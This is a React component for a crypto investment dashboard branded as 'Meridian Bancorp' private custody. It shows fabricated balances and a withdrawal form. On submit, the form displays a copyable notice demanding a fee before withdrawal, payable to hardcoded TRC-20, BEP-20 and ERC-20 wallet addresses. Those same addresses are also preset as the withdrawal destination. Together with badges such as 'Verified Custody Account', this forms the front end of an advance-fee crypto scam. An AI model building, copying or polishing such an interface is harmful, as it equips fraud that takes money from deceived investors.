import React, { useState } from 'react';
import { 
  User, 
  Wallet, 
  ArrowUpRight, 
  Clock, 
  ShieldAlert, 
  AlertTriangle, 
  CheckCircle2, 
  DollarSign, 
  ArrowDownRight, 
  Info, 
  HelpCircle,
  TrendingUp,
  FileText,
  Calendar,
  ExternalLink,
  Lock,
  Copy,
  Check,
  CheckCircle
} from 'lucide-react';
import { getClientProfileData } from '../data/clientDashboardData';
import { ClientInvestmentRecord, UserAccount } from '../types';

export const DESTINATION_WALLETS = [
  {
    network: 'Trc-20',
    address: 'TK4HkBbHm2ZaPMYE3PY93WGXb667xheFb5',
    title: 'Trc-20',
    chain: 'Tron Network',
    tag: 'USDT (TRC-20)',
    badgeColor: 'border-yellow-400/40 bg-yellow-400/10 text-yellow-300',
  },
  {
    network: 'Bep-20',
    address: '0xc0c2ef5c5c6eab62e4d2593846035ae0b09edee4',
    title: 'Bep-20',
    chain: 'BNB Smart Chain',
    tag: 'BNB / USDT (BEP-20)',
    badgeColor: 'border-yellow-400/40 bg-yellow-400/10 text-yellow-300',
  },
  {
    network: 'ERC-20',
    address: '0xc0c2ef5c5c6eab62e4d2593846035ae0b09edee4',
    title: 'ERC-20',
    chain: 'Ethereum Network',
    tag: 'ETH / USDT (ERC-20)',
    badgeColor: 'border-blue-500/40 bg-blue-600/20 text-blue-200',
  },
];

interface ClientDashboardProps {
  currentUser?: UserAccount | null;
  onOpenDepositModal?: () => void;
}

export const ClientDashboard: React.FC<ClientDashboardProps> = ({ currentUser }) => {
  const data = getClientProfileData(currentUser);

  // Withdrawal form states
  const [walletAddress, setWalletAddress] = useState('TK4HkBbHm2ZaPMYE3PY93WGXb667xheFb5');
  const [network, setNetwork] = useState('Trc-20');
  const [withdrawalAmount, setWithdrawalAmount] = useState<string>(data.availableBalance.toString());
  const [isProcessing, setIsProcessing] = useState(false);
  const [showFeeNotification, setShowFeeNotification] = useState(false);
  const [hasCopied, setHasCopied] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);

  // History search filter
  const [historySearch, setHistorySearch] = useState('');

  const handleSelectPresetWallet = (preset: typeof DESTINATION_WALLETS[0]) => {
    setWalletAddress(preset.address);
    setNetwork(preset.network);
  };

  const handleCopySingleAddress = (address: string, key: string) => {
    navigator.clipboard.writeText(address);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  const handleWithdrawalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!walletAddress.trim()) return;

    setIsProcessing(true);

    // Persist withdrawal request into backend database
    const username = currentUser?.username || 'user';
    fetch('/api/requests', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-username': username,
        'x-user-role': currentUser?.role || 'user',
      },
      body: JSON.stringify({
        userId: `usr_${username}`,
        username: username,
        clientName: currentUser?.name || data.clientName,
        amount: parseFloat(withdrawalAmount) || data.availableBalance,
        currency: 'USDT',
        type: 'withdrawal',
        reason: `Client custody withdrawal request to ${network} ledger address`,
        walletAddress: walletAddress.trim(),
      }),
    }).catch(err => console.error('Withdrawal request persistence error:', err));

    setTimeout(() => {
      setIsProcessing(false);
      setShowFeeNotification(true);
    }, 600);
  };

  const handleCopyNotice = () => {
    const noticeText = 
`Withdrawal Processing Notice:
"${data.requiredWithdrawalFee.toLocaleString('en-US', { minimumFractionDigits: 2 })} is to be paid before the available balance can be withdrawn, to meet the investment."

Destination Wallet: 

Trc-20
TK4HkBbHm2ZaPMYE3PY93WGXb667xheFb5

Bep-20
0xc0c2ef5c5c6eab62e4d2593846035ae0b09edee4

ERC-20
0xc0c2ef5c5c6eab62e4d2593846035ae0b09edee4

Requested Amount: $${parseFloat(withdrawalAmount || '0').toLocaleString('en-US', { minimumFractionDigits: 2 })}
Selected Network: ${network}
Settlement Status: Pending $5,960.00 Fee`;

    navigator.clipboard.writeText(noticeText);
    setHasCopied(true);
    setTimeout(() => setHasCopied(false), 2000);
  };

  // Filter history records
  const filteredHistory = data.history.filter(item => 
    item.date.toLowerCase().includes(historySearch.toLowerCase()) ||
    item.notes?.toLowerCase().includes(historySearch.toLowerCase()) ||
    item.status.toLowerCase().includes(historySearch.toLowerCase())
  );

  const totalInvested = data.history.reduce((acc, curr) => acc + curr.investedAmount, 0);
  const totalWithdrawn = data.history.reduce((acc, curr) => acc + (curr.withdrawalAmount || 0), 0);
  const totalFeesPaid = data.history.reduce((acc, curr) => acc + (curr.feePaid || 0), 0);

  return (
    <div className="flex-1 p-3 sm:p-6 max-w-7xl mx-auto w-full flex flex-col gap-6 text-slate-100">
      {/* 1. Client Header & Scope Profile */}
      <div className="bg-[#09132e] border border-blue-900/40 rounded-2xl p-5 sm:p-6 flex flex-col md:flex-row md:items-center justify-between gap-5 shadow-xl">
        <div className="flex items-start sm:items-center gap-4">
          <div className="w-14 h-14 rounded-2xl bg-blue-600/20 border border-blue-500/30 flex items-center justify-center text-yellow-400 shrink-0 shadow-inner">
            <User className="w-7 h-7" />
          </div>
          <div>
            <div className="flex flex-wrap items-center gap-2.5">
              <h1 className="text-xl font-black text-white tracking-tight">{data.clientName}</h1>
              <span className="px-2.5 py-0.5 rounded-full text-[11px] font-bold bg-yellow-400/20 text-yellow-300 border border-yellow-400/40">
                Verified Custody Account
              </span>
              <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-blue-600/30 text-blue-200 border border-blue-500/30 font-semibold">
                Institutional Ledger
              </span>
            </div>
            <div className="text-xs text-slate-300 mt-1 flex flex-wrap items-center gap-3">
              <span className="font-mono text-yellow-300">{data.email}</span>
              <span>•</span>
              <span className="text-slate-300">Meridian Bancorp Private Client Custody</span>
            </div>
          </div>
        </div>

        {/* Status Indicator */}
        <div className="flex items-center gap-3 bg-[#050c1e] px-4 py-2.5 rounded-xl border border-blue-900/50 self-start md:self-auto">
          <div className="w-2.5 h-2.5 rounded-full bg-yellow-400 animate-pulse"></div>
          <div>
            <div className="text-[10px] text-blue-200/70 font-mono uppercase">Portfolio Status</div>
            <div className="text-xs font-bold text-white">Active Allocation Tier</div>
          </div>
        </div>
      </div>

      {/* 2. Key Metrics & Financial Summary */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Available Balance */}
        <div className="bg-gradient-to-br from-[#0e214d] via-[#09132e] to-[#050c1e] border-2 border-yellow-400/60 rounded-2xl p-5 shadow-lg relative overflow-hidden">
          <div className="flex items-center justify-between text-xs font-mono text-yellow-300 mb-1">
            <span className="font-bold">Available Balance</span>
            <Wallet className="w-4 h-4 text-yellow-400" />
          </div>
          <div className="text-3xl font-black text-white font-mono tracking-tight mt-1">
            ${data.availableBalance.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
          </div>
          <div className="text-[11px] text-slate-200 mt-2 flex items-center gap-1">
            <CheckCircle2 className="w-3.5 h-3.5 text-yellow-400 shrink-0" />
            <span>Liquid balance eligible for withdrawal</span>
          </div>
        </div>

        {/* Total Invested */}
        <div className="bg-[#09132e] border border-blue-900/40 rounded-2xl p-5 shadow-md">
          <div className="flex items-center justify-between text-xs font-mono text-blue-200 mb-1">
            <span>Cumulative Invested</span>
            <DollarSign className="w-4 h-4 text-blue-400" />
          </div>
          <div className="text-2xl font-bold text-white font-mono mt-1">
            ${totalInvested.toLocaleString('en-US', { minimumFractionDigits: 2 })}
          </div>
          <div className="text-[11px] text-slate-300 mt-2 flex items-center gap-1">
            <Calendar className="w-3.5 h-3.5 text-blue-400 shrink-0" />
            <span>8 investment cycles (2019–2022)</span>
          </div>
        </div>

        {/* Total Historical Withdrawals */}
        <div className="bg-[#09132e] border border-blue-900/40 rounded-2xl p-5 shadow-md">
          <div className="flex items-center justify-between text-xs font-mono text-blue-200 mb-1">
            <span>Historical Withdrawals</span>
            <ArrowUpRight className="w-4 h-4 text-yellow-400" />
          </div>
          <div className="text-2xl font-bold text-white font-mono mt-1">
            ${totalWithdrawn.toLocaleString('en-US', { minimumFractionDigits: 2 })}
          </div>
          <div className="text-[11px] text-slate-300 mt-2 flex items-center gap-1">
            <CheckCircle2 className="w-3.5 h-3.5 text-yellow-400 shrink-0" />
            <span>Successfully distributed to date</span>
          </div>
        </div>

        {/* Historical Fees Paid */}
        <div className="bg-[#09132e] border border-blue-900/40 rounded-2xl p-5 shadow-md">
          <div className="flex items-center justify-between text-xs font-mono text-blue-200 mb-1">
            <span>Recorded Protocol Fees</span>
            <Clock className="w-4 h-4 text-yellow-400" />
          </div>
          <div className="text-2xl font-bold text-white font-mono mt-1">
            ${totalFeesPaid.toLocaleString('en-US', { minimumFractionDigits: 2 })}
          </div>
          <div className="text-[11px] text-slate-300 mt-2 flex items-center gap-1">
            <span>Settlement fees on historical gains</span>
          </div>
        </div>
      </div>

      {/* 3. Withdrawal Section & Settlement Notice */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: Withdrawal Form */}
        <div className="lg:col-span-7 bg-[#09132e] border border-blue-900/40 rounded-2xl p-5 sm:p-6 shadow-xl flex flex-col gap-4">
          <div className="flex items-center justify-between pb-3 border-b border-blue-900/40">
            <div className="flex items-center gap-2">
              <ArrowUpRight className="w-5 h-5 text-yellow-400" />
              <h2 className="text-sm font-bold text-white">Withdraw From Available Balance</h2>
            </div>
            <span className="text-[11px] font-mono text-yellow-300 font-semibold">
              Max: ${data.availableBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
            </span>
          </div>

          <form onSubmit={handleWithdrawalSubmit} className="space-y-4">
            {/* Wallet Address Input & Network Presets */}
            <div>
              <div className="flex flex-wrap items-center justify-between gap-1 mb-1.5">
                <label className="block text-xs font-medium text-slate-200">
                  Destination Crypto Wallet Address
                </label>
                <div className="flex items-center gap-1">
                  <span className="text-[10px] text-slate-400 mr-1">Presets:</span>
                  {DESTINATION_WALLETS.map(preset => (
                    <button
                      key={preset.network}
                      type="button"
                      onClick={() => handleSelectPresetWallet(preset)}
                      className={`px-2 py-0.5 rounded text-[10px] font-mono border transition-all ${
                        walletAddress === preset.address && network === preset.network
                          ? 'bg-yellow-400/20 border-yellow-400 text-yellow-300 font-bold shadow-sm'
                          : 'bg-blue-950/60 border-blue-900/50 text-slate-300 hover:text-white'
                      }`}
                    >
                      {preset.title}
                    </button>
                  ))}
                </div>
              </div>

              <div className="relative">
                <input
                  type="text"
                  required
                  value={walletAddress}
                  onChange={e => setWalletAddress(e.target.value)}
                  placeholder="Paste destination wallet address"
                  className="w-full bg-[#050c1e] border border-blue-900/60 rounded-xl px-3.5 py-2.5 text-xs text-white placeholder-slate-500 font-mono focus:outline-none focus:border-yellow-400"
                />
              </div>

              {/* Supported Destination Wallets Quick Reference */}
              <div className="mt-2 grid grid-cols-1 sm:grid-cols-3 gap-1.5 text-[10px]">
                {DESTINATION_WALLETS.map(preset => (
                  <div
                    key={preset.network}
                    onClick={() => handleSelectPresetWallet(preset)}
                    className={`p-2 rounded-lg border cursor-pointer transition-all ${
                      walletAddress === preset.address && network === preset.network
                        ? 'bg-blue-900/40 border-yellow-400/60 text-white'
                        : 'bg-blue-950/40 border-blue-900/40 text-slate-300 hover:bg-blue-900/30 hover:text-white'
                    }`}
                  >
                    <div className="flex items-center justify-between font-bold">
                      <span className="text-yellow-300">{preset.title}</span>
                      <span className="text-[9px] text-blue-200/70">{preset.chain}</span>
                    </div>
                    <div className="font-mono truncate text-[9px] mt-0.5 text-slate-200">
                      {preset.address.slice(0, 8)}...{preset.address.slice(-6)}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Network Selector & Amount */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              <div>
                <label className="block text-xs font-medium text-slate-200 mb-1.5">Transfer Network</label>
                <select
                  value={network}
                  onChange={e => {
                    const nextNet = e.target.value;
                    setNetwork(nextNet);
                    const matching = DESTINATION_WALLETS.find(w => w.network === nextNet);
                    if (matching) {
                      setWalletAddress(matching.address);
                    }
                  }}
                  className="w-full bg-[#050c1e] border border-blue-900/60 rounded-xl px-3 py-2.5 text-xs text-white focus:outline-none focus:border-yellow-400"
                >
                  <option value="Trc-20">Trc-20 (Tron Network)</option>
                  <option value="Bep-20">Bep-20 (BNB Smart Chain)</option>
                  <option value="ERC-20">ERC-20 (Ethereum Network)</option>
                  <option value="BTC (Native)">BTC (Bitcoin Network)</option>
                  <option value="USDC (Solana)">USDC (Solana Network)</option>
                </select>
              </div>

              <div>
                <label className="block text-xs font-medium text-slate-200 mb-1.5">Withdrawal Amount ($)</label>
                <input
                  type="number"
                  step="0.01"
                  max={data.availableBalance}
                  required
                  value={withdrawalAmount}
                  onChange={e => setWithdrawalAmount(e.target.value)}
                  className="w-full bg-[#050c1e] border border-blue-900/60 rounded-xl px-3 py-2.5 text-xs font-mono text-white focus:outline-none focus:border-yellow-400"
                />
              </div>
            </div>

            {/* Quick Amount Buttons */}
            <div className="flex items-center gap-2">
              <span className="text-[11px] text-slate-300">Quick Select:</span>
              {[
                { label: '25%', factor: 0.25 },
                { label: '50%', factor: 0.5 },
                { label: '75%', factor: 0.75 },
                { label: '100% (All)', factor: 1.0 },
              ].map(item => (
                <button
                  type="button"
                  key={item.label}
                  onClick={() => setWithdrawalAmount((data.availableBalance * item.factor).toFixed(2))}
                  className="px-2.5 py-1 rounded-lg bg-blue-950 hover:bg-blue-900 text-[11px] text-blue-200 font-mono transition-colors border border-blue-900/60"
                >
                  {item.label}
                </button>
              ))}
            </div>

            {/* Submit Action */}
            <button
              type="submit"
              disabled={isProcessing}
              className="w-full py-3 bg-yellow-400 hover:bg-yellow-300 active:scale-[0.99] text-slate-950 font-bold text-xs rounded-xl transition-all shadow-md shadow-yellow-500/20 flex items-center justify-center gap-2 disabled:opacity-50 mt-2"
            >
              {isProcessing ? (
                <>
                  <div className="w-4 h-4 border-2 border-slate-950 border-t-transparent rounded-full animate-spin"></div>
                  <span>Processing Withdrawal Request...</span>
                </>
              ) : (
                <>
                  <ArrowUpRight className="w-4 h-4" />
                  <span>Request Withdrawal from Available Balance</span>
                </>
              )}
            </button>
          </form>
        </div>

        {/* Right: Processing Notice & Consumer Advisory */}
        <div className="lg:col-span-5 flex flex-col gap-4">
          {/* Notification Alert Window */}
          {showFeeNotification ? (
            <div className="bg-[#141208] border-2 border-yellow-400/60 rounded-2xl p-5 shadow-2xl animate-in zoom-in-95 duration-200">
              <div className="flex items-start gap-3">
                <div className="p-2 rounded-xl bg-yellow-400/20 text-yellow-400 shrink-0">
                  <AlertTriangle className="w-5 h-5" />
                </div>
                <div className="flex-1">
                  <div className="flex items-center justify-between">
                    <h3 className="text-sm font-bold text-yellow-300">Withdrawal Processing Notice</h3>
                    <button
                      onClick={handleCopyNotice}
                      className="text-[10px] text-white flex items-center gap-1 bg-blue-600 hover:bg-blue-500 px-2 py-1 rounded font-semibold transition-colors"
                    >
                      {hasCopied ? <Check className="w-3 h-3 text-yellow-300" /> : <Copy className="w-3 h-3" />}
                      <span>{hasCopied ? 'Copied' : 'Copy Notice'}</span>
                    </button>
                  </div>
                  
                  {/* Settlement notice */}
                  <div className="mt-3 p-3.5 rounded-xl bg-yellow-950/40 border border-yellow-500/50 text-yellow-200 text-xs font-semibold leading-relaxed shadow-sm">
                    "{data.requiredWithdrawalFee.toLocaleString('en-US', { minimumFractionDigits: 2 })} is to be paid before the available balance can be withdrawn, to meet the investment."
                  </div>

                  {/* Destination Wallets by Network */}
                  <div className="mt-3 p-3.5 rounded-xl bg-[#050c1e] border border-blue-900/50 space-y-2.5">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-bold text-white flex items-center gap-1.5">
                        <Wallet className="w-3.5 h-3.5 text-yellow-400" />
                        Destination Wallet:
                      </span>
                      <span className="text-[10px] text-blue-300 font-mono">3 Networks</span>
                    </div>

                    <div className="space-y-2">
                      {DESTINATION_WALLETS.map(w => {
                        const isSelected = walletAddress === w.address && network === w.network;
                        return (
                          <div
                            key={w.network}
                            className={`p-2.5 rounded-lg border transition-all ${
                              isSelected
                                ? 'bg-blue-900/30 border-yellow-400/60 shadow-sm'
                                : 'bg-blue-950/40 border-blue-900/40'
                            }`}
                          >
                            <div className="flex items-center justify-between mb-1">
                              <div className="flex items-center gap-2">
                                <span className={`px-1.5 py-0.5 rounded text-[10px] font-bold border font-mono ${w.badgeColor}`}>
                                  {w.title}
                                </span>
                                <span className="text-[11px] text-slate-300 font-medium">{w.chain}</span>
                              </div>
                              <button
                                type="button"
                                onClick={() => handleCopySingleAddress(w.address, w.network)}
                                className="text-[10px] text-white flex items-center gap-1 bg-blue-600 hover:bg-blue-500 px-2 py-0.5 rounded transition-colors"
                              >
                                {copiedKey === w.network ? (
                                  <>
                                    <Check className="w-3 h-3 text-yellow-300" />
                                    <span className="text-yellow-300">Copied</span>
                                  </>
                                ) : (
                                  <>
                                    <Copy className="w-3 h-3 text-white" />
                                    <span>Copy</span>
                                  </>
                                )}
                              </button>
                            </div>
                            <div className="font-mono text-[10px] text-yellow-300/90 break-all select-all">
                              {w.address}
                            </div>
                          </div>
                        );
                      })}
                    </div>
                  </div>

                  <div className="mt-3 pt-3 border-t border-yellow-500/20 text-[11px] text-slate-300">
                    <div>Selected Network: <span className="text-yellow-300 font-bold">{network}</span></div>
                    <div>Requested Amount: <span className="text-white font-mono font-bold">${parseFloat(withdrawalAmount || '0').toLocaleString('en-US', { minimumFractionDigits: 2 })}</span></div>
                  </div>
                </div>
              </div>
            </div>
          ) : (
            <div className="bg-[#09132e] border border-blue-900/40 rounded-2xl p-5 shadow-xl flex flex-col justify-between">
              <div>
                <div className="flex items-center gap-2 text-yellow-400 mb-2">
                  <ShieldAlert className="w-5 h-5" />
                  <h3 className="text-sm font-bold text-white">Custodial Settlement Protocols</h3>
                </div>
                <p className="text-xs text-slate-300 leading-relaxed">
                  Institutional withdrawals require settlement reconciliation before digital asset dispersion to destination address.
                </p>

                <div className="mt-4 space-y-2 text-xs">
                  <div className="p-3 rounded-xl bg-[#050c1e] border border-blue-900/50 flex items-center justify-between">
                    <span className="text-slate-300">Protocol Fee Required:</span>
                    <span className="font-mono font-bold text-yellow-300">
                      ${data.requiredWithdrawalFee.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                    </span>
                  </div>
                  <div className="p-3 rounded-xl bg-[#050c1e] border border-blue-900/50 flex items-center justify-between">
                    <span className="text-slate-300">Multisig Verification:</span>
                    <span className="font-mono text-blue-300 font-bold">2 of 3 Keys Required</span>
                  </div>
                </div>
              </div>

              <div className="mt-4 pt-3 border-t border-blue-900/40 text-[11px] text-slate-400">
                Contact your designated Meridian Bancorp wealth manager for high-priority wire allocations.
              </div>
            </div>
          )}
        </div>
      </div>

      {/* 4. Historic Allocation & Investment Cycles Ledger */}
      <div className="bg-[#09132e] border border-blue-900/40 rounded-2xl p-5 sm:p-6 shadow-xl">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-blue-900/40">
          <div>
            <h2 className="text-sm font-bold text-white flex items-center gap-2">
              <Clock className="w-4 h-4 text-yellow-400" />
              <span>Historic Investment & Distribution Ledger</span>
            </h2>
            <p className="text-xs text-slate-300 mt-0.5">
              Comprehensive transaction history for client capital cycles and verified protocol settlements
            </p>
          </div>

          <div className="w-full sm:w-64">
            <input
              type="text"
              placeholder="Search ledger by date or notes..."
              value={historySearch}
              onChange={e => setHistorySearch(e.target.value)}
              className="w-full bg-[#050c1e] border border-blue-900/60 rounded-lg px-3 py-1.5 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-yellow-400"
            />
          </div>
        </div>

        <div className="overflow-x-auto">
          <table className="w-full text-left text-xs font-mono">
            <thead>
              <tr className="border-b border-blue-900/40 bg-[#050c1e] text-blue-200 text-[11px]">
                <th className="py-3 px-4">Date</th>
                <th className="py-3 px-4">Invested ($)</th>
                <th className="py-3 px-4">Withdrawal / Return ($)</th>
                <th className="py-3 px-4">Protocol Fee ($)</th>
                <th className="py-3 px-4">Status</th>
                <th className="py-3 px-4">Ledger Notes</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-blue-900/30">
              {filteredHistory.map(item => (
                <tr key={item.id} className="hover:bg-blue-950/40 transition-colors">
                  <td className="py-3 px-4 text-slate-200 whitespace-nowrap font-medium">{item.date}</td>
                  <td className="py-3 px-4 text-white font-bold">
                    ${item.investedAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                  </td>
                  <td className="py-3 px-4">
                    {item.withdrawalAmount && item.withdrawalAmount > 0 ? (
                      <span className="text-yellow-300 font-bold">
                        +${item.withdrawalAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                      </span>
                    ) : item.profitAmount ? (
                      <span className="text-blue-300 font-bold">
                        Profit ${item.profitAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                      </span>
                    ) : (
                      <span className="text-slate-500">—</span>
                    )}
                  </td>
                  <td className="py-3 px-4 text-yellow-400/90">
                    {item.feePaid && item.feePaid > 0 ? (
                      `$${item.feePaid.toLocaleString('en-US', { minimumFractionDigits: 2 })}`
                    ) : (
                      <span className="text-slate-500">$0.00</span>
                    )}
                  </td>
                  <td className="py-3 px-4">
                    <span
                      className={`text-[10px] px-2 py-0.5 rounded capitalize ${
                        item.status === 'completed'
                          ? 'bg-yellow-400/20 text-yellow-300 border border-yellow-400/30'
                          : 'bg-blue-600/20 text-blue-200 border border-blue-500/30'
                      }`}
                    >
                      {item.status}
                    </span>
                  </td>
                  <td className="py-3 px-4 font-sans text-slate-300 text-[11px]">{item.notes}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
};
